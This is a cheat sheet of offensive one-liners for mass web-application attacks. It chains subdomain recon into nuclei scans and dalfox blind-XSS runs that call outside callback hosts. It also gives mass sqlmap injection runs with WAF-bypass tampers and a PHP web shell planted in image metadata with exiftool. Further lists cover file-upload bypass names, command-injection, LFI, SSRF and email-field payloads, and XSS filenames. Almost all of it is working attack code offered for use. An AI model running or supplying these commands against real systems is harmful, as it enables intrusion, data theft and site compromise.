# Automation Command

```bash
amass intel -cidr 127.0.0.1/21 | subfinder -silent -all -o subdo.txt | rustscan -a subdo.txt -r 1-65535 | grep Open | tee open_ports.txt | sed 's/Open //' | httpx -silent | nuclei -t ~/nuclei-templates
```

```bash
cat target.com | gau -subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind username.xss.ht
```

```bash
rustscan -a 'hosts.txt' -r 1-65535 | grep Open | tee open_ports.txt | sed 's/Open //' | httpx -silent | nuclei -t ~/nuclei-templates/
```

```bash
httpx -l urls.txt -pa -o url_ips.txt

cat urls_ips.txt | grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' > ips.txt

httpx -l ips.txt -ports - -o ips_ports.txt

nuclei -l ips_ports.txt -t nuclei-templates/
```

```bash
httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
```

 ```bash
xargs -a cidr.txt -I@ bash -c 'amass intel -active -cidr @' | subfinder -all -silent | gauplus -subs | gf xss | uro | dalfox pipe --deep-domxss --multicast --blind dotdot.xss.ht
 ```
 
```bash
amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt

cat domain.txt | gauplus -random-agent -t 200 | gf xss | kxss | tee domain2.txt
```

```bash
amass enum -brute -passive -d http://example.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w wordlist.txt -u @/FUZZ -mc 200'
```

```bash
cat subdomains.txt | httpx -silent -status-code | gauplus -random-agent -t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt

ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
// search for ”uid” in burp proxy intercept 
// You can use the same query for search SSTI in qsreplase add "{{7*7}}" and search on burp for '49'
```

```bash
// **MASS SQL injection**
amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt

cat domain.txt | gauplus -random-agent -t 200 | gf sqli | tee domain2.txt

sqlmap -m domain2.txt -dbs --batch --random-agent

// **SQL Injection headers**
sqlmap -u "http://redacted.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10

// **SQL Injection bypass 401**
sqlmap -u "http://redacted.com" --dbs --batch --random-agent --forms --ignore-code=401

// PRO TIPS FOR BYPASSING WAF, add to SQLmap this tamper
--tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,space2comment,randomcase
```

```bash
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

// File Upload bypass
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.
file.php....
file.pHp5....
file.png.php
file.png.pHp5
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
flile.phpJunk123png
file.png.jpg.php
file.php%00.png%00.jpg
```

```bash
export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

``` bash
gauplus -random-agent -t 200 http://redacted.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

```bash
http://127.1/
http://0000::1:80/
http://[::]:80/
http://2130706433/
http://whitelisted@127.0.0.1
http://0x7f000001/
http://017700000001
http://0177.00.00.01
```

```bash
// **Header Injection**
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
"recipient@test.com>\r\nRCPT TO:<victim+"@test.com

// **XSS Injection**
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com

// **SST Injection**
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com

// **SQL Injection**
"' OR 1=1 -- '"@example.com
"mail'); SLEEP(5);--"@example.com

// **SSRF Attack**
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
```

```bash
<img src=x onerror=alert('XSS')>.png
"><img src=x onerror=alert('XSS')>.png
"><svg onmouseover=alert(1)>.svg
<<script>alert('xss')<!--a-->a.png
```
